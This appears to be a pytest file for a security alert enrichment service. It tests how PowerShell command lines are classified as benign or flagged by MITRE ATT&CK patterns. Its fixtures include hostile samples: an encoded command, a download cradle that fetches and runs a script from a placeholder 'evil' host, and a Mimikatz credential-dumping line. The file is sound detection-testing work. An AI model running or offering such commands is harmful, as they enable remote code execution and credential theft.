"""Tests for benign PowerShell classification + negative scoring signal.

Covers:
- TestBenignClassifier: _classify_benign_powershell identifies known-safe patterns
- TestMitreWinsOverBenign: MITRE patterns prevent benign classification
- TestBenignSignalInExtractor: negative-weight signal fires and lowers score
"""
from __future__ import annotations

from datetime import datetime, timezone
from typing import Any

from backend.app.services.enrichment.base import Signal
from backend.app.services.enrichment.mappers.endpoint import extract_powershell_execution
from backend.app.services.enrichment.scoring import compute_confidence
from backend.app.services.enrichment.sysmon_translator import (
    _classify_benign_powershell,
    translate_sysmon_event,
)


def _psbl_alert(**overrides: Any) -> dict[str, Any]:
    """Minimal PSBL-style payload that passes _is_sysmon_source."""
    alert: dict[str, Any] = {
        "_sourceName": "PowerShell",
        "process": "powershell.exe",
        "commandLine": "",
    }
    alert.update(overrides)
    return alert


def _utc(hour: int = 14) -> datetime:
    return datetime(2026, 4, 12, hour, 0, 0, tzinfo=timezone.utc)


# ─── TestBenignClassifier ─────────────────────────────────────────────────

class TestBenignClassifier:
    """_classify_benign_powershell returns a reason for known-safe patterns."""

    def test_module_import(self):
        assert _classify_benign_powershell("Import-Module ActiveDirectory") is not None
        assert "Module" in _classify_benign_powershell("Import-Module ActiveDirectory")

    def test_using_namespace(self):
        assert _classify_benign_powershell("using namespace System.IO") is not None

    def test_get_cmdlet(self):
        result = _classify_benign_powershell("Get-Process | Format-Table")
        assert result is not None
        assert "Read-only" in result

    def test_select_object(self):
        assert _classify_benign_powershell("Select-Object Name, Status") is not None

    def test_write_host(self):
        assert _classify_benign_powershell("Write-Host 'Hello world'") is not None

    def test_dsc_configuration(self):
        result = _classify_benign_powershell("Configuration MyConfig { Node 'localhost' { } }")
        assert result is not None
        assert "DSC" in result

    def test_wmi_query(self):
        result = _classify_benign_powershell("Get-CimInstance Win32_OperatingSystem")
        assert result is not None
        # Matches "Read-only cmdlet" (Get-* pattern) before reaching WMI pattern.
        # Both are correct — the important thing is it IS classified as benign.
        assert "Read-only" in result or "WMI" in result

    def test_windows_update(self):
        result = _classify_benign_powershell("Checking WindowsUpdateClient status")
        assert result is not None
        assert "Update" in result

    def test_admin_healthcheck(self):
        assert _classify_benign_powershell("Test-Connection 8.8.8.8") is not None
        assert _classify_benign_powershell("Get-Service WinDefend") is not None

    def test_profile_prompt(self):
        assert _classify_benign_powershell("function prompt { 'PS> ' }") is not None

    def test_script_metadata(self):
        assert _classify_benign_powershell("#requires -Version 5.1") is not None

    def test_unknown_script_returns_none(self):
        # A script that doesn't match any pattern is NOT classified
        assert _classify_benign_powershell("Invoke-SomethingUnknown -Param val") is None

    def test_empty_string_returns_none(self):
        assert _classify_benign_powershell("") is None
        assert _classify_benign_powershell(None) is None


# ─── TestMitreWinsOverBenign ──────────────────────────────────────────────

class TestMitreWinsOverBenign:
    """A script matching BOTH a MITRE pattern AND a benign pattern
    should get the MITRE technique and NOT be classified as benign."""

    def test_encoded_command_not_benign(self):
        """An encoded PowerShell command fires T1059.001, never benign."""
        alert = _psbl_alert(
            commandLine=(
                "powershell.exe -enc "
                "SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAA=="
            )
        )
        translate_sysmon_event(alert)
        assert alert.get("_encodedCommand") is True
        assert alert.get("_benignPowerShell") is not True

    def test_download_cradle_not_benign(self):
        """Download cradle fires T1059.001, never benign."""
        alert = _psbl_alert(
            commandLine="IEX(New-Object Net.WebClient).DownloadString('http://evil/a.ps1')"
        )
        translate_sysmon_event(alert)
        assert alert.get("_downloadCradle") is True
        assert alert.get("_benignPowerShell") is not True

    def test_mimikatz_in_module_import_not_benign(self):
        """'Import-Module Invoke-Mimikatz' matches both benign (Import-Module)
        AND MITRE (sekurlsa/mimikatz). MITRE should win."""
        alert = _psbl_alert(
            commandLine="Import-Module Invoke-Mimikatz; sekurlsa::logonpasswords"
        )
        translate_sysmon_event(alert)
        # MITRE should fire (T1003.001 for sekurlsa)
        assert alert.get("_lsassAccess") is True
        # Benign should NOT fire
        assert alert.get("_benignPowerShell") is not True

    def test_benign_script_IS_classified(self):
        """A genuinely benign script with no MITRE match IS classified."""
        alert = _psbl_alert(commandLine="Get-Process | Format-Table Name, CPU")
        translate_sysmon_event(alert)
        assert alert.get("_benignPowerShell") is True
        assert alert.get("_benignPowerShellReason") is not None


# ─── TestBenignSignalInExtractor ─────────────────────────────────────────

class TestBenignSignalInExtractor:
    """The benign_powershell signal fires in extract_powershell_execution
    with a negative weight that lowers the case score."""

    def test_benign_flag_produces_negative_signal(self):
        raw = {"_benignPowerShell": True, "_benignPowerShellReason": "Read-only cmdlet"}
        signals = extract_powershell_execution(raw, "medium", _utc())
        benign = [s for s in signals if s.name == "benign_powershell"]
        assert len(benign) == 1
        assert benign[0].fired is True
        assert benign[0].weight < 0  # negative weight

    def test_non_benign_no_negative_signal(self):
        raw = {}  # no _benignPowerShell flag
        signals = extract_powershell_execution(raw, "medium", _utc())
        benign = [s for s in signals if s.name == "benign_powershell"]
        assert len(benign) == 1
        assert benign[0].fired is False  # present but not fired

    def test_benign_lowers_overall_score(self):
        """A case with benign_powershell should score lower than one without."""
        base_signals = [
            Signal("after_hours", 18, True, "After hours"),
            Signal("lolbin_abuse", 15, True, "LOLBin"),
        ]
        # Without benign
        score_without, _, _ = compute_confidence("medium", base_signals)

        # With benign (negative signal added)
        benign_signals = base_signals + [
            Signal("benign_powershell", -15, True, "Benign PowerShell"),
        ]
        score_with, _, _ = compute_confidence("medium", benign_signals)

        assert score_with < score_without
        assert score_without - score_with >= 10  # at least 10 point drop
